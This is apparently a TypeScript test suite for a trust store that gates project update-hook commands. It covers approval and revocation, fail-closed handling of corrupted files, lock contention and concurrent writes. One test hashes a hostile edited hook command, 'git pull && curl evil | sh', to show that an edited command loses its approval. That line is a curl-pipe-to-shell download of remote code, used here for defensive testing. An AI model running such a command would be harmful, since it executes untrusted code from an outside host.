/**
 * Trust-store lifecycle and write-integrity tests.
 *
 * The persisted record is the whole trust state (unapproved / approved /
 * stale), so these tests pin each transition plus the two failures that a
 * plain `writeFileSync` of a read-modify-write store has: a concurrent
 * `recordTrust` dropping another process's approval, and an interrupted write
 * leaving a truncated `trusted.json`.
 */

import { describe, test, expect, beforeEach, afterEach } from "vitest";
import { spawn } from "node:child_process";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { setTimeout as sleep } from "node:timers/promises";
import { fileURLToPath, pathToFileURL } from "node:url";
import { openDatabase, type Database } from "../src/db.js";
import {
  getTrustFilePath,
  getTrustLockPath,
  hookDigest,
  isTrusted,
  listTrusted,
  loadTrustStore,
  recordTrust,
  revokeTrust,
  type UpdateHook,
} from "../src/trust.js";

const thisDir = dirname(fileURLToPath(import.meta.url));
const projectRoot = join(thisDir, "..");
const trustModuleUrl = pathToFileURL(join(projectRoot, "src", "trust.ts")).href;
const isBunRuntime = "Bun" in globalThis;
const tsxCli = join(projectRoot, "node_modules", "tsx", "dist", "cli.mjs");
const runnerArgs = isBunRuntime ? [] : [tsxCli];

const hooks: UpdateHook[] = [{ collection: "docs", command: "git pull --ff-only" }];

let configDir: string;
let scratchDir: string;
const origConfigDir = process.env.QMD_CONFIG_DIR;

beforeEach(() => {
  configDir = mkdtempSync(join(tmpdir(), "qmd-trust-lifecycle-cfg-"));
  scratchDir = mkdtempSync(join(tmpdir(), "qmd-trust-lifecycle-work-"));
  process.env.QMD_CONFIG_DIR = configDir;
});

afterEach(() => {
  if (origConfigDir !== undefined) process.env.QMD_CONFIG_DIR = origConfigDir;
  else delete process.env.QMD_CONFIG_DIR;
  for (const dir of [configDir, scratchDir]) {
    try { rmSync(dir, { recursive: true, force: true }); } catch { /* ignore */ }
  }
});

/** A `.qmd/index.yml` path inside a throwaway project directory. */
function localConfigPath(): string {
  const project = mkdtempSync(join(tmpdir(), "qmd-trust-lifecycle-proj-"));
  mkdirSync(join(project, ".qmd"), { recursive: true });
  return join(project, ".qmd", "index.yml");
}

function storedStore(): unknown {
  return JSON.parse(readFileSync(getTrustFilePath(), "utf-8"));
}

describe("trust lifecycle transitions", () => {
  test("unapproved → approved → unapproved", () => {
    const configPath = localConfigPath();
    const digest = hookDigest(hooks);

    expect(isTrusted(configPath, digest)).toBe(false);
    recordTrust(configPath, digest);
    expect(isTrusted(configPath, digest)).toBe(true);
    expect(listTrusted().map(r => r.path)).toEqual([resolve(configPath)]);

    expect(revokeTrust(configPath)).toBe(true);
    expect(isTrusted(configPath, digest)).toBe(false);
    expect(revokeTrust(configPath)).toBe(false);
    expect(loadTrustStore()).toEqual({});
  });

  test("editing a gated command re-arms the approval without a write", () => {
    const configPath = localConfigPath();
    const approved = hookDigest(hooks);
    const edited = hookDigest([{ collection: "docs", command: "git pull && curl evil | sh" }]);

    recordTrust(configPath, approved);
    // Stale state: the record is still there, it just no longer covers this digest.
    expect(isTrusted(configPath, edited)).toBe(false);
    expect(loadTrustStore()[resolve(configPath)]?.hooks).toBe(approved);

    recordTrust(configPath, edited);
    expect(isTrusted(configPath, edited)).toBe(true);
    expect(isTrusted(configPath, approved)).toBe(false);
  });
});

describe("trust store fail-closed reads", () => {
  test("a truncated store reads as unapproved and the next approval repairs it", () => {
    const configPath = localConfigPath();
    const digest = hookDigest(hooks);

    mkdirSync(configDir, { recursive: true });
    writeFileSync(getTrustFilePath(), '{\n  "/tmp/somewhere/.qmd/index.yml": {\n    "hooks": "ab', "utf-8");
    expect(loadTrustStore()).toEqual({});
    expect(isTrusted(configPath, digest)).toBe(false);

    recordTrust(configPath, digest);
    expect(isTrusted(configPath, digest)).toBe(true);
    expect(listTrusted().map(r => r.path)).toEqual([resolve(configPath)]);
    expect(storedStore()).toBeTypeOf("object");
  });

  test("entries that are not trust records are dropped, not coerced", () => {
    const approved = localConfigPath();
    const missingTimestamp = localConfigPath();
    const notARecord = localConfigPath();
    const numericDigest = localConfigPath();
    const digest = hookDigest(hooks);

    mkdirSync(configDir, { recursive: true });
    writeFileSync(getTrustFilePath(), JSON.stringify({
      [resolve(approved)]: { hooks: digest, trustedAt: "2026-01-01T00:00:00.000Z" },
      [resolve(missingTimestamp)]: { hooks: digest },
      [resolve(notARecord)]: "trusted",
      [resolve(numericDigest)]: { hooks: 7, trustedAt: "2026-01-01T00:00:00.000Z" },
    }, null, 2), "utf-8");

    expect(loadTrustStore()).toEqual({
      [resolve(approved)]: { hooks: digest, trustedAt: "2026-01-01T00:00:00.000Z" },
    });
    expect(isTrusted(approved, digest)).toBe(true);
    for (const unreadable of [missingTimestamp, notARecord, numericDigest]) {
      expect(isTrusted(unreadable, digest)).toBe(false);
    }
  });
});

describe("trust store writes", () => {
  test("publishes without leaving temp files behind", () => {
    const configPath = localConfigPath();
    recordTrust(configPath, hookDigest(hooks));

    expect(existsSync(getTrustFilePath())).toBe(true);
    expect(readdirSync(configDir).filter(name => name.endsWith(".tmp"))).toEqual([]);
    expect(storedStore()).toBeTypeOf("object");
  });

  test("a temp file abandoned by an interrupted writer is ignored", () => {
    const configPath = localConfigPath();
    const digest = hookDigest(hooks);
    recordTrust(configPath, digest);

    writeFileSync(`${getTrustFilePath()}.4242.deadbeef.tmp`, '{"truncated": ', "utf-8");
    expect(isTrusted(configPath, digest)).toBe(true);

    revokeTrust(configPath);
    expect(isTrusted(configPath, digest)).toBe(false);
  });

  test("a writer that cannot take the write lock fails closed", () => {
    const configPath = localConfigPath();
    const digest = hookDigest(hooks);
    let holder: Database | undefined;
    try {
      holder = openDatabase(getTrustLockPath());
      holder.exec("BEGIN EXCLUSIVE");

      // Waits out the lock budget, then reports: an approval that could not be
      // serialised is never written behind the holder's back.
      expect(() => recordTrust(configPath, digest)).toThrow();
      expect(existsSync(getTrustFilePath())).toBe(false);
      expect(isTrusted(configPath, digest)).toBe(false);
    } finally {
      try { if (holder?.inTransaction) holder.exec("ROLLBACK"); } catch { /* ignore */ }
      try { holder?.close(); } catch { /* ignore */ }
    }

    recordTrust(configPath, digest);
    expect(isTrusted(configPath, digest)).toBe(true);
  });

  test("approvals from two concurrent processes both survive", async () => {
    const rounds = 40;
    const ids = ["a", "b"];
    const projects = join(scratchDir, "projects");
    const readyDir = join(scratchDir, "ready");
    const barrierPath = join(scratchDir, "barrier");
    mkdirSync(readyDir, { recursive: true });

    const scriptPath = join(scratchDir, "writer.ts");
    writeFileSync(scriptPath, writerScript(readyDir, barrierPath, projects, rounds), "utf-8");

    const spawned = ids.map(id => {
      const child = spawn(process.execPath, [...runnerArgs, scriptPath, id], {
        env: { ...process.env, QMD_CONFIG_DIR: configDir },
        stdio: ["ignore", "pipe", "pipe"],
      });
      let stderr = "";
      child.stderr?.on("data", (chunk: Buffer) => { stderr += chunk.toString(); });
      const { promise: exited, resolve: resolveExit, reject } = Promise.withResolvers<{ code: number; stderr: string }>();
      child.once("error", reject);
      child.once("close", code => resolveExit({ code: code ?? 1, stderr }));
      return { child, exited };
    });

    try {
      // Start both writers only once both have loaded the module, so their
      // read-modify-write loops actually overlap instead of running back to back.
      const deadline = Date.now() + 30_000;
      while (!ids.every(id => existsSync(join(readyDir, id)))) {
        if (Date.now() > deadline) throw new Error("writers did not become ready in time");
        await sleep(10);
      }
      writeFileSync(barrierPath, "go", "utf-8");

      const results = await Promise.all(spawned.map(writer => writer.exited));
      const codes = results.map(result => result.code);
      if (codes.some(code => code !== 0)) {
        throw new Error(`trust writers failed:\n${results.map(result => result.stderr).join("\n")}`);
      }
      expect(codes).toEqual(ids.map(() => 0));
    } finally {
      for (const writer of spawned) {
        if (writer.child.exitCode === null && writer.child.signalCode === null) writer.child.kill("SIGKILL");
      }
    }

    const store = loadTrustStore();
    for (const id of ids) {
      for (let i = 0; i < rounds; i++) {
        const configPath = resolve(projects, id, `p${i}`, ".qmd", "index.yml");
        const digest = `digest-${id}-${i}`;
        expect(store[configPath]?.hooks).toBe(digest);
        expect(isTrusted(configPath, digest)).toBe(true);
      }
    }
    expect(listTrusted()).toHaveLength(ids.length * rounds);
  });
});

/**
 * Child writer: announce readiness, wait for the barrier, then approve a
 * distinct config path per round so any lost read-modify-write is permanent.
 */
function writerScript(readyDir: string, barrierPath: string, projects: string, rounds: number): string {
  return `
import { existsSync, writeFileSync } from "node:fs";
import { setTimeout as sleep } from "node:timers/promises";

async function main() {
  const id = process.argv[2];
  // The specifier is a runtime-computed file URL: this script is generated into
  // a temp dir, so a static import cannot name it.
  const { recordTrust } = await import(${JSON.stringify(trustModuleUrl)});
  writeFileSync(${JSON.stringify(readyDir)} + "/" + id, String(process.pid));

  const deadline = Date.now() + 30000;
  while (!existsSync(${JSON.stringify(barrierPath)})) {
    if (Date.now() > deadline) throw new Error("timed out waiting for the start barrier");
    await sleep(5);
  }

  const base = ${JSON.stringify(projects)};
  for (let i = 0; i < ${rounds}; i++) {
    recordTrust(base + "/" + id + "/p" + i + "/.qmd/index.yml", "digest-" + id + "-" + i);
    await sleep(1);
  }
}

main().catch(err => {
  console.error(err);
  process.exit(1);
});
`;
}
